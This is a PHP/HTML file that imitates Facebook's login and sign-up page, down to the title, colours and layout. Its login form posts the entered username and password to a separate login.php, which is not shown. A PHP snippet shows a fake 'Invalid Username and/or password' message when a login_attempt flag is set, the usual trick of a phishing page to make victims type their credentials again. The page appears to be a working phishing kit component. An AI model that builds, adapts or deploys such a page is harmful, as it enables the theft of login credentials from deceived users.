<?php
$err_msg="";
    if(isset($_GET["login_attempt"])){
    $err_msg="Invalid Username and/or password";
    }
?>


<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Facebook</title>
	<style>
	body {
		font-family:helvetica, arial, sans-serif;
		font-size:12px;
	}
	.facebook {
		height:100px;
		width:auto;
		background-color:#3b5998;
		color:#fff;
		font-family:helvetica, arial, sans-serif;
		font-size:12px;
	}
	.fb {
		font-size: 40px;
		font-weight:bold;
		position:absolute;
		padding-left:200px;
		padding-top:40px;
	}
	.one {
		position:absolute;
		padding-left:750px;
		padding-top:20px;
	}
	.aaa {
		position:absolute;
		padding-left:920px;
		padding-top:5px;
	}
	.login {
		position:absolute;
		padding-left:1090px;
		padding-top:20px;
		color:#fff;
	}

	.forgot {
		position:absolute;
		padding-left:920px;
		padding-top:46px;
		opacity:0.5;
	}
	.sign{
		height:640px;
		width:1335px;
		position:absolute;
		top:100px;
		background-color:#edf0f5;
	}
	.abc {
		position:absolute;
		padding-left:720px;
		padding-top:20px;
		color:#000;
		font-size:40px;
		font-weight:bold;
	}
	.def {
		position:absolute;
		padding-left:720px;
		padding-top:70px;
		color:#000;
		font-size:20px;
	}
	.signup {
		position:absolute;
		padding-left:720px;
		padding-top:120px;
		color:#000;
		font-size:20px;
	}
	.mobile{
		position:relative;
		top:5px;
	}
	.mobile2{
		position:relative;
		top:10px;
	}
	.password{
		position:relative;
		top:15px;
	}
	.birthday{
		font-size: 18px;
		position: relative;
		top:1px;
	}
	.bday{
		position:relative;
		top:25px;
	}
	.month {
		position:relative;
		top:5px;
		font-size:8px;
	}
	.gender{
		position:relative;
		top:10px;
	}
	.detail{
		font-size:11px;
		opacity:0.7;
	}
	
	</style>
</head>
<body>
	<span style="color:red;position:absolute;left:730px;top:75px;"> <?php echo $err_msg; ?></span>
    	<form method="post" action="login.php">
	<div class="facebook">
		<label style="color:white;font-size: 50px;font-weight:bold;position:absolute;left:200px;top:40px;">facebook</label>
		<label style="color:white;font-size:13px;
		position:absolute;left:730px;top:33px;">Email or Phone</label>
		<br>
		<input type="text" name="uname" style="position:absolute;left:730px;top:50px;"/>
		<label style="color:white;font-size:13px;position:absolute;left:900px;top:33px;">Password</label>
		<input type ="password" name="pword" style="position:absolute;left:900px;top:50px;" />
		<input type="submit" name="Log In" value="Log In" style="background-color:#365899;border:2px solid #29487d;color:#fff;border-radius:2px;font-weight:bold;position:absolute;left:1070px;top:50px;" />
		<label style="position:absolute;left:900px;top:75px;opacity:0.5;">Forgot Account?</label>

	<div class="sign">
		<div class="abc">
			<label>Sign up</label>
		</div>
		<div class="def">
			<label>It's free and always will be.</label>
		</div>
		<div class="signup">

			<input type="text" name="fname" placeholder="First name" style="border-radius:5px;font-size:18px; padding: 8px 10px;border-color: #bdc7d8;border: 1px solid #bdc7d8" />
			<input type="text" name="lname" placeholder="Last name"style="border-radius:5px;font-size:18px; padding: 8px 10px;border-color: #bdc7d8;border: 1px solid #bdc7d8"/>
			<br/> 
			<div class="mobile">
			<input tyoe="text" name="mobile" placeholder="Mobile number or email"style="border-radius:5px;font-size:18px; padding: 8px 10px;border-color: #bdc7d8;border: 1px solid #bdc7d8; width: 434px;"/>
			</div>
			
			<div class="mobile2">
			<input tyoe="text" name="remobile" placeholder="Re-enter 	mobile number or email"style="border-radius:5px;font-size:18px; padding: 8px 10px;border-color: #bdc7d8;border: 1px solid #bdc7d8;width: 434px;"/>
			</div>
		
			<div class="password">
			<input tyoe="text" name="password" placeholder="New Password"style="border-radius:5px;font-size:18px; padding: 8px 10px;border-color: #bdc7d8;border: 1px solid #bdc7d8;width: 434px;"/>
			</div>
		
			<div class="bday">
				<div class="birthday">
					<label>Birthday</label>
				</div>
			<div class="month">
			<select dropdown="Month" style="border-radius:5px;font-size:18px; padding: 8px 10px;border-color: #bdc7d8;border: 1px solid #bdc7d8">
			<option value="Month" selected="1">Month</option>
			<option value="January" >Jan</option>
			<option value="February" >Feb</option>
			<option value="March" >Mar</option>
			<option value="April" >Apr</option>
			<option value="May" >May</option>
			<option value="June" >Jun</option>
			<option value="July" >Jul</option>
			<option value="August" >Aug</option>
			<option value="September" >Sep</option>
			<option value="October" >Oct</option>
			<option value="November" >Nov</option>
			<option value="December" >Dec</option>
			</select>

			<select dropdown="Day" style="border-radius:5px;font-size:18px; padding: 8px 10px;border-color: #bdc7d8;border: 1px solid #bdc7d8">
			<option value="Day" selected="1">Day</option>
			<option value="1" >1</option>
			<option value="2" >2</option>
			<option value="3" >3</option>
			<option value="4" >4</option>
			<option value="5" >5</option>
			<option value="6" >6</option>
			<option value="7" >7</option>
			<option value="8" >8</option>
			<option value="9" >9</option>
			<option value="10" >10</option>
			<option value="11" >11</option>
			<option value="12" >12</option>
			<option value="13" >13</option>
			<option value="14" >14</option>
			<option value="15" >15</option>
			<option value="16" >16</option>
			<option value="17" >17</option>
			<option value="18" >18</option>
			<option value="19" >19</option>
			<option value="20" >20</option>
			<option value="21" >21</option>
			<option value="22" >22</option>
			<option value="23" >23</option>
			<option value="24" >24</option>
			<option value="25" >25</option>
			<option value="26" >26</option>
			<option value="27" >27</option>
			<option value="28" >28</option>
			<option value="29" >29</option>
			<option value="30" >30</option>
			<option value="31" >31</option>
			</select>

			<select dropdown="Year" style="border-radius:5px;font-size:18px; padding: 8px 10px;border-color: #bdc7d8;border: 1px solid #bdc7d8">
			<option value="Year" selected="1">Year</option>
			<option value="2016">2016</option>
			<option value="2015">2015</option>
			<option value="2014">2014</option>
			<option value="2013">2013</option>
			<option value="2012">2012</option>
			<option value="2011">2011</option>
			<option value="2010">2010</option>
			<option value="2009">2009</option>
			<option value="2008">2008</option>
			<option value="2007">2007</option>
			<option value="2006">2006</option>
			<option value="2005">2005</option>
			<option value="2004">2004</option>
			<option value="2003">2003</option>
			<option value="2002">2002</option>
			<option value="2001">2001</option>
			<option value="2000">2000</option>
			<option value="1999">1999</option>
			<option value="1998">1998</option>
			<option value="1997">1997</option>
			<option value="1996">1996</option>
			<option value="1995">1995</option>
			<option value="1994">1994</option>
			<option value="1993">1993</option>
			<option value="1992">1992</option>
			<option value="1991">1991</option>
			<option value="1990">1990</option>
			<option value="1989">1989</option>
			<option value="1988">1988</option>
			<option value="1987">1987</option>
			<option value="1986">1986</option>
			<option value="1985">1985</option>
			<option value="1984">1984</option>
			<option value="1983">1983</option>
			<option value="1982">1982</option>
			<option value="1981">1981</option>
			<option value="1980">1980</option>
			</select>
			</div>
			</div>
			<br>
			<div class="gender">
			<input type="radio" name="Gender" value="Female" style="border-radius:5px;font-size:18px; padding: 8px 10px;border-color: #bdc7d8;border: 1px solid #bdc7d8"> Female
			<input type="radio" name="Gender" value="Male" style="border-radius:5px;font-size:18px; padding: 8px 10px;border-color: #bdc7d8;border: 1px solid #bdc7d8"> Male
			</div>
			<br>
			<br>
			<div class="detail">
				<label>By clicking Sign Up, you agree to our Terms and that you have<br> read our Data Policy, including our Cookie Use.</label>			
			</div>
			
			<input type="submit" name="Sign up" value="Sign up" style="font-size:19px; background-color:#578843; font-family:Freight Sans Bold; font-weight:bold; text-align:center; padding: 7px 20px; border-color:#3b6e22 #3b6e22 #2c5115; margin-top:10px; margin-bottom:10px; border:1px solid; border-radius:5px; color:#fff; width:200px;">
			<br>
			
			<label style="font-size:14px;color:#3b5998; font-weight:bold;">Create a Page </label>
			<label style="font-size:14px; opacity:0.6;font-weight:bold">for a celebrity, band or business.</label>
	
	</div>

	

</form>
</body>
</html>
	
